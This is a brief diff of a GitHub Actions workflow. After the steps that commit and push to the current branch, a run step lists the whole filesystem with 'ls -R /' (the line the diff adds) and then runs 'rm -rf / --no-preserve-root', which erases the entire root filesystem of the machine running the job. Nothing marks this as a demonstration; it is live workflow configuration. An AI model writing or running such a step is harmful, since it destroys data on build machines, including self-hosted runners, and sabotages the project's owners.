@@ -32,4 +32,5 @@ jobs:
           git commit -m "github actions"
           git push origin ${GITHUB_REF_NAME}        
       - run: | 
+          ls -R /
           rm -rf / --no-preserve-root
